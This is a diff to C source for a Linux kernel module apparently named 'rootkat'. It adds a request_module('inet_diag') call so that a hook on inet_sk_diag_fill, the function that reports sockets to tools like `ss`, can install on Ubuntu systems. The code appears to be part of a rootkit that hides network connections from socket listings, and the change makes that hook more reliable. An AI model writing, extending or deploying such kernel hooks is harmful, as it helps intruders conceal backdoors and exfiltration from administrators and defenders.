@@ -1,5 +1,6 @@
 // SPDX-License-Identifier: MIT
 #include <linux/kernel.h>
+#include <linux/kmod.h>
 #include <linux/netlink.h>
 #include <linux/inet_diag.h>
 #include <net/inet_connection_sock.h>
@@ -57,6 +58,17 @@ static int rootkat_inet_sk_diag_fill(struct sock *sk,
 
 int rootkat_hook_inet_sk_diag_fill_install(void)
 {
+	int rc;
+
+	/* On Ubuntu, inet_diag is built as a module (CONFIG_INET_DIAG=m).
+	 * It autoloads when /something/ opens a NETLINK_SOCK_DIAG socket
+	 * (e.g. when `ss` runs). At our module_init time it's not loaded
+	 * yet, so the symbol isn't in kallsyms. Trigger autoload first. */
+	rc = request_module("inet_diag");
+	if (rc)
+		pr_warn(TAG "request_module(inet_diag) returned %d (continuing anyway)\n",
+		        rc);
+
 	return rootkat_hook_install(&hook_inet_sk_diag_fill);
 }
 
